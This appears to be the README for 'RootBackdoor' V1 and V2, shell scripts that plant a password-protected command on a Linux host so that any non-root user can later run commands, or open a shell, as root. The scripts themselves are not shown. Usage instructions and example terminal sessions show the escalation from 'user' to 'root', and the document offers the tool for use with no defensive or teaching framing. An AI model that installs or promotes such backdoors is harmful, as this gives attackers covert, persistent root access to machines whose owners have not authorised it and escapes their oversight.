# RootBackdoor

Usage:
```
# chmod +x backdoor.sh
# ./backdoor.sh <backdoor> <password>
```

As non-root user run:
```
$ <backdoor> <password> <command>
```

Example:
```
root@machine:~# ./backdoor.sh root bl33dz
root@machine:~# su user
user@machine:~$ whoami
user
user@machine:~$ root bl33dz whoami
root
```


# RootBackdoor V2

Usage:
```
# chmod +x backdoorV2.sh
# ./backdoor.sh <backdoor> <password> <shell>
```

As non-root user run:
```
$ <backdoor>
```
It will ask you password

Example:
```
root@machine:~# ./backdoorV2.sh ruut bleedz33 /bin/bash
root@machine:~# su user
user@machine:~$ whoami
user
user@machine:~$ ruut
PASSWORD:
root@machine:~# whoami
root
```
